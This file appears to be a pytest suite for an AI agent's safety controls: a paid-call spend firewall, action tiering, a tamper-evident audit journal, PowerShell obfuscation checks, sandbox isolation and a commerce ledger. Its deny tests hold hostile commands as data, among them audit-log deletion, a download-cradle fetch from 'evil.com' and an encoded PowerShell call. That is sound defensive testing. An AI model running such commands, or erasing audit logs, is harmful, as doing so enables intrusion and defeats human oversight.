"""Comprehensive test suite for Master Audit 2x Upgrade:
Branch 5: SpendFirewall, zero-dollar cloud gate, LocalComputeCostVector, linter
Branch 6: L1_offload diagnostic T0, A4_audit immutable log, PowerShell AST, ASTRA JobObject Sandbox
Branch 8: AuditJournal v2 (O(1) append, fsync, msvcrt locking, HMAC-SHA256, tail corruption detection)
Branch 11: MCP tool Cyrillic transliteration in normalize_name
Branch 14: Strict margin enforcer in quote.py & OrderToDeliveryLedger across all 6 commerce nodes
"""
from __future__ import annotations

import datetime
from decimal import Decimal
import json
import os
import sys
from pathlib import Path

import pytest

# Ensure repo root and command-center are on sys.path
_ROOT = Path(__file__).resolve().parents[2]
for p in (_ROOT, _ROOT / "command-center", _ROOT / "bossman-core"):
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))

from bcc.security.spend_firewall import (
    SpendFirewall,
    LocalComputeCostVector,
    PaidCallBlockedError,
    TokenInvalidOrConsumedError,
)
from bcc.security.astra_sandbox import (
    WindowsJobObjectSandbox,
    verify_self_modify_candidate_isolation,
)
from bcc.audit_journal import AuditJournal
from bcc.features.pc_agent_policy import classify_pc_action
from bcc.features.pc_agent_policy_guards import (
    is_immutable_audit_log_target,
    validate_powershell_ast_or_tokens,
    canonicalize_windows_path_safe,
)
from bcc.v2.mcp_hub import normalize_name
from bcc.features.commerce_ledger import (
    OrderToDeliveryLedger,
    ExplicitMarginRequiredError,
    RevenueStatus,
    OrderState,
)
from bossman_shared.exchange_assistant.quote import (
    compute_quote_strict,
    QuoteError,
)
from bossman_shared.exchange_assistant.rates import RateBook, Rate


# ---------------------------------------------------------------------------
# Branch 5: Cloud SpendFirewall & Linter Tests
# ---------------------------------------------------------------------------

def test_spend_firewall_blocks_paid_call_without_owner_token():
    fw = SpendFirewall()
    with pytest.raises(PaidCallBlockedError, match="FAIL-CLOSED"):
        fw.verify_pre_call_free_or_authorized(
            provider="OpenRouter",
            model="z-ai/glm-5.3-flash",
            pricing={"prompt": 0.0001, "completion": 0.0002},
            owner_token=None,
        )


def test_spend_firewall_allows_free_model_zero_cost():
    fw = SpendFirewall()
    res = fw.verify_pre_call_free_or_authorized(
        provider="OpenRouter",
        model="nvidia/nemotron-3-ultra-550b-a55b:free",
        pricing={"prompt": 0, "completion": 0},
    )
    assert res["status"] == "ALLOWED_FREE"
    assert res["paid"] is False


def test_spend_firewall_consumes_one_time_token_single_use():
    fw = SpendFirewall()
    token = fw.issue_one_time_owner_token(purpose="Finalize sprint task")

    # 1. First call succeeds and consumes token
    res1 = fw.verify_pre_call_free_or_authorized(
        provider="OpenRouter",
        model="z-ai/glm-5.3-flash",
        pricing={"prompt": 0.05, "completion": 0.10},
        owner_token=token,
    )
    assert res1["status"] == "AUTHORIZED_PAID"
    assert res1["token_consumed"] == token

    # 2. Replay attack fails closed
    with pytest.raises(TokenInvalidOrConsumedError, match="already been consumed"):
        fw.verify_pre_call_free_or_authorized(
            provider="OpenRouter",
            model="z-ai/glm-5.3-flash",
            pricing={"prompt": 0.05, "completion": 0.10},
            owner_token=token,
        )


def test_spend_firewall_local_compute_cost_vector_calculation():
    fw = SpendFirewall()
    vec = fw.record_local_compute(gpu_seconds=3600.0, ram_gb_seconds=7200.0, cpu_seconds=1800.0)
    assert vec.gpu_seconds == 3600.0
    assert vec.ram_gb_seconds == 7200.0
    cost = vec.estimate_cost_usd(gpu_hour_rate_usd=0.50, ram_gb_hour_rate_usd=0.01, cpu_hour_rate_usd=0.04)
    # 1h * 0.50 + 2h * 0.01 + 0.5h * 0.04 = 0.50 + 0.02 + 0.02 = 0.54
    assert cost == pytest.approx(0.54, abs=0.001)


def test_spend_firewall_linter_detects_unapproved_direct_http():
    from tools.check_no_direct_llm_http import check_file, audit_critical_targets
    # Ensure critical targets pass audit
    repo_root = Path(__file__).resolve().parents[2]
    violations = audit_critical_targets(repo_root)
    assert len(violations) == 0, f"Critical bypass violations: {violations}"


# ---------------------------------------------------------------------------
# Branch 6: PC-Agent (L1_offload, A4_audit, PowerShell AST, ASTRA Sandbox)
# ---------------------------------------------------------------------------

def test_l1_offload_diagnostic_tools_classified_t0():
    tools = [
        "pc.process_list",
        "pc_process_list",
        "pc.resource_snapshot",
        "pc.top_cpu_ram",
        "pc.disk_health",
        "computer.observe",
        "pc.observe_screen",
    ]
    for tool_name in tools:
        verdict = classify_pc_action(tool_name, {})
        assert verdict.tier == "T0", f"Tool {tool_name} was classified as {verdict.tier}, expected T0"
        assert verdict.decision == "auto"


def test_a4_audit_direct_deletion_blocked_immutable():
    verdict = classify_pc_action("pc.run_command", {"cmd": "del audit.jsonl"})
    assert verdict.tier == "T3"
    assert verdict.category == "blocked_immutable_audit_log"
    assert verdict.decision == "deny"


def test_a4_audit_backup_and_delete_evasion_blocked():
    verdict = classify_pc_action("pc.run_command", {"cmd": "echo ok"}, task_prompt="сделай бэкап и удали audit.jsonl, он занимает место")
    assert verdict.tier == "T3"
    assert verdict.category == "blocked_immutable_audit_log"
    assert verdict.decision == "deny"


def test_a4_audit_docs_audits_and_evidence_protected():
    assert is_immutable_audit_log_target("Remove-Item docs/audits/report.md") is True
    assert is_immutable_audit_log_target("rm -rf evidence/test_run") is True
    assert is_immutable_audit_log_target("docs/audits/2026-10-28") is True
    # Read-only text without mutation should not trigger
    assert is_immutable_audit_log_target("read docs/audits/report.md") is False


def test_powershell_ast_backtick_obfuscation_blocked():
    safe, reason = validate_powershell_ast_or_tokens("i`e`x (new-object net.webclient)")
    assert safe is False
    assert "backtick" in reason


def test_powershell_ast_encoded_and_download_blocked():
    safe1, _ = validate_powershell_ast_or_tokens("powershell.exe -EncodedCommand SGVsbG8=")
    assert safe1 is False
    safe2, _ = validate_powershell_ast_or_tokens("(New-Object Net.WebClient).DownloadString('http://evil.com')")
    assert safe2 is False
    safe3, _ = validate_powershell_ast_or_tokens("Get-Process | Select-Object -First 5")
    assert safe3 is True


def test_canonicalize_windows_path_resolves_escapes(tmp_path: Path):
    test_file = tmp_path / "target.txt"
    test_file.write_text("hello", encoding="utf-8")
    escaped = f"\\\\?\\GLOBALROOT\\Device\\HarddiskVolume1\\{test_file.name}"
    canon = canonicalize_windows_path_safe(escaped)
    assert "GLOBALROOT" not in canon


def test_astra_sandbox_job_object_limits_and_status():
    if sys.platform != "win32":
        pytest.skip("Windows Job Object is Windows-specific")
    with WindowsJobObjectSandbox(name="test_astra_job", memory_limit_mb=1024) as sb:
        status = sb.get_status()
        assert status.job_created is True
        assert status.kill_on_close is True
        assert status.memory_limit_bytes == 1024 * 1024 * 1024


def test_astra_sandbox_self_modify_unisolated_host_fails_closed():
    # In absence of hermetic docker container with --network=none, self_modify is refused
    res = verify_self_modify_candidate_isolation()
    assert res["allowed"] is False
    assert res["status"] == "verification_blocked_unisolated"
    assert res["tests_passed"] is False


# ---------------------------------------------------------------------------
# Branch 8: AuditJournal v2 Tests
# ---------------------------------------------------------------------------

def test_audit_journal_v2_o1_append_and_head_anchor(tmp_path: Path):
    j_path = tmp_path / "audit.jsonl"
    journal = AuditJournal(j_path)
    rec1 = journal.append(actor="owner", task_id=1, run_id=1, tool="pc.observe", args={}, tier="T0", decision="auto", result="ok")
    assert rec1["seq"] == 1

    rec2 = journal.append(actor="owner", task_id=1, run_id=1, tool="pc.observe", args={}, tier="T0", decision="auto", result="ok2")
    assert rec2["seq"] == 2
    assert rec2["prev_hash"] == rec1["entry_hash"]

    # Verify .head anchor exists and matches
    anchor_file = tmp_path / "audit.jsonl.head"
    assert anchor_file.exists()
    anchor_data = json.loads(anchor_file.read_text(encoding="utf-8"))
    assert anchor_data["entry_hash"] == rec2["entry_hash"]
    assert anchor_data["seq"] == 2

    # Verification passes
    v = journal.verify_chain()
    assert v["ok"] is True
    assert v["count"] == 2


def test_audit_journal_v2_corrupted_tail_detected(tmp_path: Path):
    j_path = tmp_path / "audit.jsonl"
    journal = AuditJournal(j_path)
    journal.append(actor="owner", task_id=1, run_id=1, tool="pc.observe", args={}, tier="T0", decision="auto", result="ok")

    # Inject corrupted tail (partial JSON write)
    with j_path.open("a", encoding="utf-8") as f:
        f.write('{"seq": 2, "incomplete_json":\n')

    v = journal.verify_chain()
    assert v["ok"] is False
    assert v["reason"] == "corrupted_tail_detected"


def test_audit_journal_v2_hmac_sha256_tamper_evidence(tmp_path: Path):
    j_path = tmp_path / "audit.jsonl"
    secret_key = "super-secret-hmac-key"
    journal = AuditJournal(j_path, hmac_key=secret_key)

    rec = journal.append(actor="owner", task_id=1, run_id=1, tool="pc.observe", args={}, tier="T0", decision="auto", result="ok")
    assert "hmac_sha256" in rec
    assert len(rec["hmac_sha256"]) == 64

    # Verify passes
    v = journal.verify_chain()
    assert v["ok"] is True


# ---------------------------------------------------------------------------
# Branch 11: MCP Cyrillic Normalization
# ---------------------------------------------------------------------------

def test_mcp_normalize_name_cyrillic_transliteration():
    assert normalize_name("поиск_базы") == "poisk_bazy"
    assert normalize_name("база_данных_проверка") == "baza_dannykh_proverka"
    assert normalize_name("simple_english_tool") == "simple_english_tool"


# ---------------------------------------------------------------------------
# Branch 14: Commerce - Strict Margin & Order-to-Delivery Ledger
# ---------------------------------------------------------------------------

def test_compute_quote_strict_requires_explicit_margin():
    now = datetime.datetime(2026, 10, 28, 12, 0, tzinfo=datetime.timezone.utc)
    rates = [
        Rate("USDCZK", Decimal("25.00"), "test", now, "owner"),
        Rate("USDTUSD", Decimal("1.000"), "test", now, "owner"),
    ]
    book = RateBook(rates)

    # Calling with require_explicit_margin=True and margin=None MUST FAIL CLOSED
    with pytest.raises(QuoteError, match="FAIL-CLOSED"):
        compute_quote_strict(
            book,
            give_ccy="USDT",
            get_ccy="CZK",
            now=now,
            give_amount=Decimal("1000"),
            margin=None,
            require_explicit_margin=True,
        )

    # Calling with explicit margin succeeds
    q = compute_quote_strict(
        book,
        give_ccy="USDT",
        get_ccy="CZK",
        now=now,
        give_amount=Decimal("1000"),
        margin=Decimal("0.03"),
        require_explicit_margin=True,
    )
    assert q.give_amount == Decimal("1000")
    assert q.margin == Decimal("0.03")


def test_commerce_ledger_six_nodes_workflow():
    ledger = OrderToDeliveryLedger()

    # Node 1 & 2: Packages & Demand
    order = ledger.record_buyer_demand(
        client_id="client-alpha-001",
        package_sku="PKG-SWAPME-REMIT-01",
        volume=Decimal("1000"),
        currency="USDT",
    )
    assert order.state == OrderState.DEMAND_LOGGED

    # Node 3: Costing with explicit margin
    econ = ledger.calculate_offer_cost(
        order.order_id,
        gross_revenue=Decimal("1000.00"),
        margin_pct=Decimal("0.03"),
        api_cost=Decimal("0.05"),
        compute_cost=Decimal("0.10"),
        fees=Decimal("0.85"),
        require_explicit_margin=True,
    )
    # net_margin = 1000 * 0.03 - 0.05 - 0.10 - 0.85 = 30.00 - 1.00 = 29.00
    assert econ.net_margin == Decimal("29.00")
    assert order.state == OrderState.OFFER_COSTED

    # Node 4: Delivery
    delivery = ledger.deliver_order(
        order.order_id,
        deliverable_payload={"settlement_account": "CZ123456789", "delivered_czk": "24250.00"},
    )
    assert order.state == OrderState.DELIVERED
    assert "receipt_hash" in delivery

    # Node 5: Revenue Accounting (Paper demo)
    rev_status = ledger.settle_revenue(order.order_id, payment_proof=None)
    assert rev_status == RevenueStatus.PAPER_DEMO
    assert order.state == OrderState.SETTLED

    # Node 6: Refunds
    refund = ledger.process_refund(order.order_id, reason="Customer canceled partial batch", refund_amount=Decimal("10.00"))
    assert order.state == OrderState.REFUNDED
    assert refund["refunded_amount"] == "10.00"

    # Verify all 6 nodes in trail
    assert len(order.node_trail) == 6


def test_commerce_ledger_paper_demo_vs_audited_revenue_strict_isolation():
    ledger = OrderToDeliveryLedger()
    order = ledger.record_buyer_demand(
        client_id="demo-client",
        package_sku="PKG-SWAPME-REMIT-01",
        volume=Decimal("500"),
    )
    ledger.calculate_offer_cost(order.order_id, gross_revenue=Decimal("500"), margin_pct=Decimal("0.03"))
    ledger.deliver_order(order.order_id, deliverable_payload={"status": "mock_delivered"})

    # Settle without verified external payment proof
    status = ledger.settle_revenue(order.order_id, payment_proof={"mock": True})
    assert status == RevenueStatus.PAPER_DEMO

    summary = ledger.get_ledger_summary()
    assert summary["audited_paid_orders"] == 0
    assert summary["audited_external_revenue_usd"] == "0.00"
    assert summary["paper_demo_orders"] == 1
    assert summary["invariant_audited_revenue_matches_zero_when_no_real_proof"] is True
